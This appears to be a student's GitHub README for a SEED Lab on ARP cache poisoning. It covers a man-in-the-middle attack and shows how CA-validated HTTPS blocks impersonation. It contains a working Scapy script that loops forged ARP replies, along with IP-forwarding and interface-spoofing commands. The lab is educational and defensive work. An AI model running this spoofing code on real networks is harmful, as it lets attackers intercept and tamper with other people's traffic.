# ARP Cache Poisoning Attack Lab

<div align="center">

![Lab](https://img.shields.io/badge/SEED%20Lab-ARP%20Poisoning-red?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)
![Tools](https://img.shields.io/badge/Tools-Scapy%20%7C%20Wireshark%20%7C%20OpenSSL-blue?style=for-the-badge)

</div>

**Student:** Zernouh Lakhdar  
**University:** Amar Telidji University, Laghouat, Algeria  
**Lab Series:** SEED Labs — Syracuse University  

---

## 🎯 Objective

This lab demonstrates how **ARP Cache Poisoning** can be exploited to perform a **Man-in-the-Middle (MITM)** attack on a local network. By sending forged ARP replies, an attacker can redirect traffic between two hosts through their machine — intercepting, inspecting, or modifying communication in transit. The lab further examines how **HTTPS with a proper Certificate Authority (CA)** defeats MITM impersonation, and how self-signed certificates leave users vulnerable.

---

## 🛠️ Environment Setup

| Component | Details |
|-----------|---------|
| **Attacker OS** | Kali Linux (VirtualBox Internal Network) |
| **Server OS** | Ubuntu 20.04 |
| **Client OS** | Ubuntu 20.04 |
| **Network** | VirtualBox Internal Network (`10.10.0.0/24`) |
| **Attacker IP** | `10.10.0.2` |
| **Server IP** | `10.10.0.100` |
| **Client IP** | `10.10.0.1` |
| **Tools** | Scapy 2.4+, Wireshark, arpspoof (dsniff), Apache2, OpenSSL, curl |

---

## ✅ Tasks Completed

- ✅ **Task 1** — Configure a legitimate HTTPS web server (Apache2 + self-signed certificate)
- ✅ **Task 2** — Write and execute ARP spoofing script using Scapy to poison client and server ARP caches
- ✅ **Task 3** — Intercept HTTPS traffic with self-signed certificate (observe browser warning bypass)
- ✅ **Task 4** — Build a private Certificate Authority (CA) using OpenSSL
- ✅ **Task 5** — Generate CA-signed server certificate with proper Subject Alternative Names (SAN)
- ✅ **Task 6** — Install CA certificate on client machine and verify browser trust
- ✅ **Task 7** — Re-run ARP poisoning attack — verify that CA-signed cert prevents impersonation

---

## 🧠 Key Concepts Covered

- **ARP protocol** — stateless, unauthenticated, no source verification
- **ARP cache poisoning** — injecting forged `ARP Reply` packets to redirect traffic
- **IP forwarding** — enabling attacker machine to relay intercepted packets transparently
- **Virtual interface binding** — hosting the server's IP on the attacker interface
- **Man-in-the-Middle (MITM)** — passive interception and active manipulation of traffic
- **TLS/SSL handshake** — certificate validation, chain of trust, CA hierarchy
- **Self-signed vs. CA-signed certificates** — differences in trust establishment
- **OpenSSL** — key generation, CSR creation, certificate signing, SAN extensions
- **`update-ca-certificates`** — deploying CA trust on Linux clients

---

## 📊 Key Findings

| Scenario | Outcome | Explanation |
|----------|---------|-------------|
| Self-signed cert, no ARP attack | ⚠️ Browser warning | Certificate issuer not trusted by browser |
| Self-signed cert **+** ARP spoof | ✅ **Attack succeeds** | User clicks "Accept Risk" → attacker intercepts HTTPS |
| CA-signed cert, no ARP attack | ✅ Secure connection | Certificate trusted via CA chain |
| CA-signed cert **+** ARP spoof | ❌ **Attack blocked** | Attacker's cert not signed by trusted CA → connection refused |

**Key Takeaway:** ARP poisoning is trivially easy on a flat Layer-2 network. However, HTTPS with proper CA validation prevents impersonation — the attacker cannot forge a valid certificate. The critical vulnerability is **user behavior**: clicking through certificate warnings completely undermines HTTPS security.

---

## 💻 Code & Scripts

All scripts are located in the [`code/`](./code/) folder.

### ARP Spoofing Script (Scapy)
```python
# arp_spoof.py — Poison ARP caches of client and server
from scapy.all import *
import time

victim_ip   = "10.10.0.1"    # Client
gateway_ip  = "10.10.0.100"  # Server
attacker_mac = get_if_hwaddr("eth0")

def get_mac(ip):
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    ans, _ = srp(broadcast / arp_req, timeout=2, verbose=False)
    return ans[0][1].hwsrc

victim_mac  = get_mac(victim_ip)
gateway_mac = get_mac(gateway_ip)

print(f"[*] Poisoning ARP caches...")
while True:
    # Tell client: gateway is at attacker's MAC
    send(ARP(op=2, pdst=victim_ip,  hwdst=victim_mac,  psrc=gateway_ip,  hwsrc=attacker_mac), verbose=False)
    # Tell server: client is at attacker's MAC
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip,   hwsrc=attacker_mac), verbose=False)
    time.sleep(2)
```

### Enable IP Forwarding
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

### Virtual Interface (Impersonate Server IP)
```bash
sudo ifconfig eth0:0 10.10.0.100 netmask 255.255.255.0
```

### Build a Certificate Authority
```bash
# Generate CA private key
openssl genrsa -out myCA.key 2048

# Self-sign CA certificate (10-year validity)
openssl req -x509 -new -nodes -key myCA.key -sha256 -days 3650 \
  -out myCA.pem \
  -subj "/C=DZ/ST=Laghouat/O=MyCA/CN=MyRootCA"
```

### Generate and Sign Server Certificate
```bash
# Server key + CSR
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr \
  -subj "/C=DZ/ST=Laghouat/O=WebServer/CN=10.10.0.100"

# Sign with our CA (add SAN extension)
openssl x509 -req -in server.csr -CA myCA.pem -CAkey myCA.key \
  -CAcreateserial -out server.crt -days 365 -sha256 \
  -extfile <(printf "subjectAltName=IP:10.10.0.100")
```

### Install CA on Client (Ubuntu)
```bash
sudo cp myCA.pem /usr/local/share/ca-certificates/myCA.crt
sudo update-ca-certificates
# Verify
curl https://10.10.0.100  # Should connect without error
```

---

## 🖼️ Screenshots

Screenshots are located in the [`screenshots/`](./screenshots/) folder:

| File | Description |
|------|-------------|
| `01-legit-server.png` | Browser showing legitimate HTTPS server (self-signed warning) |
| `02-arp-table-before.png` | Client ARP table before the attack |
| `03-arp-spoof-running.png` | Scapy ARP poisoning script in action |
| `04-arp-table-after.png` | Client ARP table showing attacker's MAC for server IP |
| `05-wireshark-arp.png` | Wireshark capture of forged ARP Reply packets |
| `06-https-intercept.png` | Attacker intercepting HTTPS traffic (certificate warning) |
| `07-ca-created.png` | CA certificate generated with OpenSSL |
| `08-ca-signed-cert.png` | Server certificate signed by custom CA |
| `09-ca-installed-client.png` | CA cert imported on client (`update-ca-certificates`) |
| `10-attack-blocked.png` | Browser/curl rejecting attacker's cert after CA deployment |
| `11-wireshark-tls.png` | Wireshark showing TLS handshake failure on spoofed connection |

---

## 📄 References

- **Lab Manual:** [`lab-instructions.pdf`](./lab-instructions.pdf) — included in this folder
- **SEED Labs:** https://seedsecuritylabs.org/Labs_20.04/Crypto/Crypto_TLS/
- **RFC 826** — An Ethernet Address Resolution Protocol
- **RFC 5246** — The TLS Protocol Version 1.2
- **OpenSSL Docs:** https://www.openssl.org/docs/

---

> 🔬 *This lab is part of the [SEED Labs](https://seedsecuritylabs.org/) series by Syracuse University. All experiments conducted in isolated virtual environments for educational purposes only.*
